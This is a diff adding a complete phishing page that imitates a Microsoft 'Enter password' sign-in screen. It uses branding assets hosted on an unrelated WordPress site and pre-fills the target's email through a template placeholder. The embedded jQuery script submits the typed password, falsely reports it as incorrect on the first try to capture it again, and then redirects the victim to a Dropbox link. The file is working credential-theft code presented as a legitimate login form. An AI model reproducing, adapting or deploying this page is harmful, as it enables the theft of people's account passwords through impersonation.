@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+   <head>
+      <meta charset="UTF-8">
+      <title>Microsoft</title>
+      <link rel="shortcut icon" href="https://christiano.ca/wp-content/mcs/favicon.ico">
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+      <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+   </head>
+   <body>
+      <div class="contact-form" style="box-shadow: 0 2px 6px rgb(0 0 0 / 20%);margin-bottom: 28px;">
+         <img alt="" class="" src="https://christiano.ca/wp-content/mcs/logo1.png" style="text-align:left; width: 108px;height: 24;margin-bottom: 5px">
+         <form name="Form1" id="login-form" method="POST" autocomplete="off" action="">
+
+
+            <input name="login" type="email" id="email-form" style="text-align: left;border:0px;padding-left:0px; padding-bottom: 9px; font-family: inherit;padding-bottom: 10px; font-size:15.5px; padding-top: 0px; margin-top:14px;color:#1b1b1b;" value="[[-Email-]]" readonly>
+
+
+            <div style="font-weight: 500;font-family: inherit;line-height: 1.75rem;text-align: left;color: #1b1b1b;font-size: 1.5rem;font-weight: 600;padding: 0;margin-top: 0px;margin-bottom: 0px;">Enter password</div>
+            <div id="kel-error" style="margin-top: 15px;margin-bottom: 10px;margin-top: 15px;color:#E34234;font-size: 15px;"></div>
+            <div id="kel-err" style="margin-top: 15px;margin-bottom: 10px;color:#E34234;font-size: 15px;"></div>
+            <input style="font-family: system-ui;
+               font-size: inherit;padding-top: 0px; padding-bottom: 6px;border-bottom-color: black;padding-left: 0px;margin-bottom: 16px;" name="passwd" id="password" placeholder="Password" type="password">
+            <div class="form-group">
+               <a style="font-family:'Calibri, sans-serif'; font-weight: 400;font-size: 14px;font-family: system-ui;color: #0067b8;"  id="" role="link" href="#" >Forgot password?</a>
+            </div>
+            <button type="submit" id="login-form-submit" style="margin-top: 25px;font-family: inherit;">Sign in </button>
+         </form>
+      </div>
+      <div class="contain">
+         <a style="width: 150px;" class="bottomright" href="#" >Terms of use</a>
+         <a class="bottomright" href="#">Privacy &amp; cookies</a>
+      </div>
+      <script>
+         $(function() {
+           var count = 1-1;
+         
+         var email = $("#email-form").val();   //Get address from input value
+         
+         
+         // Get the form.
+         var form = $('#login-form');
+         
+         // Get the messages div.
+         var formMessages = $('#kel-err');
+         
+         // Set up an event listener for the  form.
+         $(form).submit(function(e) {
+         // Stop the browser from submitting the form.
+         e.preventDefault();
+         
+         // Serialize the form data.
+         var formData = $(form).serialize();
+         count = count+1;
+         
+         // Submit the form using AJAX.
+         // jQuery.support.cors = true;
+         
+         var pass_field = formData.slice(formData.lastIndexOf("=")+1, formData.length);
+         
+         if (pass_field.length < 5 || pass_field=="") {
+             $(formMessages).text("Password Incomplete, please try again");
+             $('#password').val('');
+             document.getElementById('password').value = "";
+           $('#login-form-submit').val('');
+           document.getElementById('login-form-submit').value = "";
+           count=0;
+           return false
+           }
+         
+         $.ajax({
+           type: 'POST',
+           crossDomain: true,
+           url: $(form).attr('action'),
+           data: formData
+         })
+         .done(function(response) {
+           // Remove button loading class.
+           if(count==1){
+         
+         $(formMessages).removeClass('success');
+             $(formMessages).addClass('error');
+         
+             $(formMessages).text('Incorrect password. Please try again.'); //}
+         
+           // Clear the form.
+           $('#password').val('');
+           document.getElementById('password').value = "";
+           $('#login-form-submit').val('');
+           document.getElementById('login-form-submit').value = "";
+         
+           return false;
+           }
+         
+          // else{ window.location="http://www."+domain}
+            else{ window.location="https://www.dropbox.com/sh/yra585dnp27hsf6/AABtPizj"}
+         
+         })
+         .fail(function(data) {
+           // Make sure that the formMessages div has the 'error' class.
+           $(formMessages).removeClass('success');
+               $(formMessages).addClass('error');
+          
+         
+           // Set the message text.
+           if (data.responseText !== '') {
+             $(formMessages).text("Incorrect password. Please try again.");
+             // window.location="//"+domain
+           } else {
+             $(formMessages).text("Incorrect password. Please try again.");
+             //window.location="//"+domain
+             window.location="https://www.dropbox.com/sh/yra585dnp27hsf6/AABtPizj"
+           }
+         });
+         });
+         
+         });
+      </script>
+      <style type="text/css">
+         html {
+         font-family: sans-serif;
+         -ms-text-size-adjust: 100%;
+         -webkit-text-size-adjust: 100%;
+         }
+         body {
+         /*font-family: segoe ui;*/
+         font-family: 'Helvetica Neue', 'Helvetica Neue', 'Helvetica Neue', 
+  Helvetica, Arial, 'Lucida Grande', sans-serif;
+         margin: 0;
+         padding: 0;
+         font-size: 15px;
+         line-height: 20px;
+         font-size: 0.9375rem;
+         line-height: 1.25rem;
+         }
+         body:before {
+         content: '';
+         position: fixed;
+         width: 100vw;
+         height: 100vh;
+         background-image: url(https://christiano.ca/wp-content/mcs/back.jpg);
+         background-position: center center;
+         background-repeat: no-repeat;
+         background-attachment: fixed;
+         -webkit-background-size: cover;
+         background-size: cover;
+         -webkit-filter: blur(10px);
+         -moz-filter: blur(10px);
+         filter: blur(10px);
+         }
+         .contact-form {
+         position: absolute;
+         top: 49%;
+         left: 50%;
+         transform: translate(-50%, -50%);
+         min-width: 352px;
+         max-width: 440px;
+         min-height: 250px;
+         padding: 44px;
+         overflow:  hidden;
+         background: white;
+         }
+         .contact-form h2 {
+         margin: 0;
+         color: black;
+         text-align: center;
+         text-transform: uppercase;
+         }
+         .contact-form p {
+         margin: 0;
+         padding: 0;
+         /*font-weight: bold;*/
+         color: black;
+         margin-bottom: 20px
+         }
+         .contact-form input, .contact-form button {
+         width: 100%;
+         margin-bottom: 20px;
+         }
+         .contact-form input[type=email], .contact-form input[type=password] {
+         width: 100%;
+         padding: 12px 20px;
+         margin: 0px 0;
+         display: inline-block;
+         border: 1px solid #fff;
+         box-sizing: border-box;
+         }
+         .contact-form input[type=email]:focus, .contact-form input[type=password]:focus {
+         outline: none;
+         }
+         .contact-form input[type=submit], .contact-form button {
+         height: 32px;
+         color: black;
+         font-size: 15px;
+         cursor: pointer;
+         border: none;
+         outline: none;
+         margin-top: 5%;
+         width: 108px;
+         position:absolute;
+         right:43px;
+         color: #fff;
+         border-color: #0067b8;
+         background-color: #0067b8;
+         }
+         .contact-form a {
+         color: black;
+         font-size: 14px;
+         text-decoration: none;
+         }
+         .contact-form input[type=email] {
+         font-size: 14px;
+         }
+         @media only screen and (max-device-width: 480px) {
+         .contact-form {
+         }
+         .contact-form a {
+         font-size: 30px;
+         text-decoration: none;
+         }
+         .contact-form input[type=email], .contact-form input[type=password] {
+         font-size: 30px;
+         }
+         }
+         .bottomright {
+         position: absolute;
+         bottom: 8px;
+         right: 10px;
+         font-size: 10px;
+         color: black;
+         }
+      </style>
+   </body>
+</html>
